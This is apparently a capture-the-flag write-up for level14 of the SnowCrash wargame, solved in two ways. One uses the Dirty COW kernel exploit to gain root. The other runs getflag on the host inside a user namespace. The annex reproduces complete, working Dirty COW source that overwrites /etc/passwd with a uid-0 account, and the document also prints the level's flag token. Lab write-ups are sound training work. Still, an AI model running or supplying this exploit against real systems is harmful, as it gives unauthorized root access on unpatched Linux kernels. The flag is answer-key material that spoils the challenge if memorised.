# Objective

As `level14`, the goal is to exploit a vulnerability to gain `flag14`'s privileges and read the flag, which is the password for `levelfinal`.

The flag is gained through the command `getflag`, run as `flag14`.

```sh
level14@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```


# Content of home

Nothing special.

```sh
level14@SnowCrash:~$ pwd
/home/user/level14

level14@SnowCrash:~$ ll
total 12
dr-x------ 1 level14 level14  100 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level14 level14  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level14 level14 3518 Aug 30  2015 .bashrc*
-r-x------ 1 level14 level14  675 Apr  3  2012 .profile*
```


# Further inquiry

Any special file?

```sh
level14@SnowCrash:~$ find / -user flag14 2> /dev/null
level14@SnowCrash:~$ 
```

Any listening port that left unexploited?

```sh
State      Recv-Q Send-Q             Local Address:Port                      Peer Address:Port 
LISTEN     0      128                           :::4646                                :::*         # level12
LISTEN     0      128                           :::4747                                :::*         # level04
LISTEN     0      128                           :::80                                  :::*
LISTEN     0      128                           :::4242                                :::*         # SSH port
LISTEN     0      128                            *:4242                                 *:*         # SSH port
LISTEN     0      32                     127.0.0.1:5151                                 *:*         # level11
```

Let us try and communicate through the port 80.

```sh
# Port 80
level14@SnowCrash:~$ curl 127.1:80
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
```

Nothing. It is in fact the default Apache2 page.

We haven't much left. What is the last thing that hasn't been exploited yet? `getflag` itself.

One issue remains though.

```sh
level14@SnowCrash:~$ ltrace getflag
__libc_start_main(0x8048946, 1, 0xbffff7f4, 0x8048ed0, 0x8048f40 <unfinished ...>
ptrace(0, 0, 1, 0, 0)                                                                                         = -1
puts("You should not reverse this"You should not reverse this
)                                                                           = 28
+++ exited (status 1) +++
```

We are not expected to exploit `getflag`. At least not by looking at its code.


# Resolution

In order not to trigger its anti-trace protection mechanism, what if we could pretend we are who the program expects us to be? In this case, the `flag14` user.

Linux`s kernel provides this very mechanism through the `namespaces`.

Unfortunately, the provided iso is old and its version (Ubuntu 3.2.0) didn't fully support yet the full `namespace` feature. The `user namespaces` were still experimental and reserved to the `root` user.

Two solutions:
- Become root
- Benefit from the fact we come from the future and `scp` the getflag function onto our host machine.

Let us do both

## Become `root`

One major Linux kernel vulnerabitly that permitted to easily become `root` was discovered at the end of 2016. It affected the kernel version from 2.6.22 to 4.4.26. This exploit was called `Dirty COW` and exploited the ernel `copy-on-write` mechanism.

Our kernel version can be exploited. Good!

### Dirty COW

Let us import and compile the code (see below) to be used as the exploit.

```sh
level14@SnowCrash:~$ chmod 777 .
level14@SnowCrash:~$ cat > exploit.c
# code pasted

level14@SnowCrash:~$ gcc -pthread exploit.c -o dirty -lcrypt
```

Let us `cat /etc/passwd` before.

```sh
level14@SnowCrash:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
# shortened
```

Then let us run the exploit.

```sh
level14@SnowCrash:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
toor:to5bce5sr7eK6:0:0:pwned:/root:/bin/bash

mmap: b7fda000
^C

level14@SnowCrash:~$ cat /etc/passwd
toor:to5bce5sr7eK6:0:0:pwned:/root:/bin/bash

level14@SnowCrash:~$ su - toor
Password: # toor
toor@SnowCrash:~# 
```

Now that we are root, we can be anyone we want!

```sh
toor@SnowCrash:~# su - flag14
Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
flag14@SnowCrash:~$ getflag
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```

## We came from the future!

Let us steal the `getflag` executable.

```sh
sh-5.3$ scp -P 4242 level14@localhost:/bin/getflag .    

level14@localhost's password: 
getflag                                                                                                                                         100%   12KB   1.3MB/s   00:00 
```

One issue though, is that our modern host doesn't share the same libraries as this good old `getflag`.

```sh
sh: ./getflag: cannot execute: required file not found
sh-5.3$ file getflag 

getflag: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=41bcce3fb6d2326e75eac775228132855df1f0ca, not stripped
```

We miss the `/lib/ld-linux.so.2` interpreter. Let us steal it!

On the virtual machine:
```sh
level14@SnowCrash:~$ realpath /lib/ld-linux.so.2
/lib/i386-linux-gnu/ld-2.15.so
```

On the host:
```sh
scp -P 4242 level14@localhost:/lib/i386-linux-gnu/ld-2.15.so .
level14@localhost's password: 
ld-2.15.so                                                                                                   100%  131KB   3.2MB/s   00:00
```

Let us try:
```sh
sh-5.3$ ./ld-2.15.so getflag 
getflag: error while loading shared libraries: getflag: cannot open shared object file: No such file or directory
```

Grmbl!

Let's go further and create the full environment.

On the virtual machine:
```sh
level14@SnowCrash:~$ ldd /bin/getflag
        linux-gate.so.1 =>  (0xb7fff000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
        /lib/ld-linux.so.2 (0x80000000)

```

On the host machine:
```sh
mkdir -p /tmp/snowcrash-runtime
scp -P 4242 level00@127.1:/bin/getflag /tmp/snowcrash-getflag
scp -P 4242 \
  level00@127.1:/lib/i386-linux-gnu/ld-2.15.so \
  level00@127.1:/lib/i386-linux-gnu/libc-2.15.so \
  /tmp/snowcrash-runtime/
ln -s libc-2.15.so /tmp/snowcrash-runtime/libc.so.6

unshare --map-user=3014 \
  /tmp/snowcrash-runtime/ld-2.15.so \
  --library-path /tmp/snowcrash-runtime \
  /tmp/snowcrash-getflag
```

Then let us create the `namespace` as 3014.

```sh
unshare --map-user=3014 \
  /tmp/snowcrash-runtime/ld-2.15.so \
  --library-path /tmp/snowcrash-runtime \
  /tmp/snowcrash-getflag

Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```


# Annexes

The `Dirty COW` exploit code.

```c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "toor".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su toor" or "ssh toor@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "firefart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "toor";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "toor";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```